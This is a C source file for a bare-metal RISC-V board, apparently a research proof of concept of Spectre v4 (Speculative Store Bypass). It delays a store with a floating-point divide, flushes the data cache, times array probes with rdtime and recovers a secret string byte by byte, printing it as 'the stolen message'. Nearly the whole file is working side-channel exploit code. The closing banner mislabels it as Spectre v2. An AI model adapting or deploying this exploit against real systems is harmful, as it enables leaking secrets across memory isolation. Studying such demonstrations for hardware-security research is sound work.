#include <stdio.h>
#include <stdint.h>
#include "datatype.h"
#include "uart.h"

#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
#define SECRET_SZ 40
#define CACHE_HIT_THRESHOLD 85
#define L1_BLOCK_SZ_BYTES 64
uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
uint8_t *p_array2 = array2;
uint8_t unused3[64];
char secret_atk[SECRET_SZ];
uint8_t unused4[64];
char *secretString = "The Magic Words are Squeamish Ossifrage.";
//char *secretString = "The";

void topTwoIdx(uint64_t *inArray, uint64_t inArraySize, uint8_t *outIdxArray, uint64_t *outValArray)
{
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i)
    {
        if (inArray[i] > outValArray[0])
        {
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1])
        {
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}

uint64_t str_index = 1;
uint64_t temp0 = 0;
uint64_t temp1 = 0;
uint8_t dummy = 1;
uint64_t str[256];

void victim_function(uint64_t idx)
{
    str[1] = idx;   
    asm("fcvt.s.lu	fa4, %[in]\n"       
        "fcvt.s.lu	fa5, %[inout]\n"    
        "fdiv.s	fa5, fa5, fa4\n"        
        "fcvt.lu.s	%[out], fa5, rtz\n" 
        : [out] "=r"(str_index)
        : [inout] "r"(str_index), [in] "r"(dummy)
        : "fa4", "fa5");
    str[str_index] = 0;
    temp0 &= array2[array1[str[1]] * L1_BLOCK_SZ_BYTES];
}

int main(void)
{
    uint64_t attackIdx = (uint64_t)(secretString - (char *)array1);
    uint64_t start, diff, end;
    //char secret_atk[SECRET_SZ];
    static uint64_t results[256];
    

     /* ------------------------------- setup uart ------------------------------- */
    uart_cfig.baudrate = BAUD;       // any integer value is allowed
    uart_cfig.parity = PARITY_NONE;     // PARITY_NONE / PARITY_ODD / PARITY_EVEN
    uart_cfig.stopbit = STOPBIT_1;      // STOPBIT_1 / STOPBIT_2
    uart_cfig.wordsize = WORDSIZE_8;    // from WORDSIZE_5 to WORDSIZE_8
    uart_cfig.txmode = ENABLE;          // ENABLE or DISABLE
    // open UART device with id = 0 (UART0)
    ck_uart_open(&uart0, 0);
    // initialize uart using uart_cfig structure
    ck_uart_init(&uart0, &uart_cfig);
    /* ----------------------------- end setup uart ----------------------------- */


    printf("================= This is a POC of spectre_v4 (Speculative Store Bypass) ========================= \n");
    printf("the secret key is:%s \n", secretString);

    // try to read out the secret
    for (uint64_t len = 0; len < SECRET_SZ; ++len)
    {
        //dummy = 2;
        // clear results every round
        for (uint64_t cIdx = 0; cIdx < 256; ++cIdx)
        {
            results[cIdx] = 0;
        }
        str_index = 1;
        
        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for (uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound)
        {
            // clear L1 cache
            asm volatile("Dcache.ciall");
            
            //fence cache clear and victim function
            for(uint64_t i = 0; i < 1024; ++i){asm volatile("nop");}
            
            // !!! victim function !!!
            victim_function(attackIdx);

            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i)
            {
                p_array2 = array2 + i * L1_BLOCK_SZ_BYTES;
                uint64_t uiTemp = 0; // introduced a dummy variable to prevent compiler optimizations
                asm volatile(
                    "fence rw, rw\n" // Memory barrier
                    "rdtime %0"      // Read timestamp into output operand
                    : "=r"(start));
                //temp1 &= array2[i * L1_BLOCK_SZ_BYTES];
                asm volatile("fence rw, rw");
                asm volatile(
                    "lw %0, %1(%2)"
                    : "=r"(temp1)
                    : "i"(0), "r"(p_array2));
                asm volatile(
                    "fence rw, rw\n" // Memory barrier
                    "rdtime %0"      // Read timestamp into output operand
                    : "=r"(end));
                diff = (end - start);

                if (diff < CACHE_HIT_THRESHOLD)
                {
                    results[i] += 1;
                }
                //dummy = 2;
                //printf("diff[%d]:%d\n",i,diff);
            }
        }

        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t *)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]);
        //printf("str is %d\n",str[1]);
        secret_atk[len] = output[1];
        // read in the next secret
        ++attackIdx;
    }
    // show atk results
    printf("The stolen message is '%s'\n", secret_atk);
    printf("********************* spectre v2 end *********************\n\n");
    ck_uart_close(&uart0);
    while(1);
    return 0;
}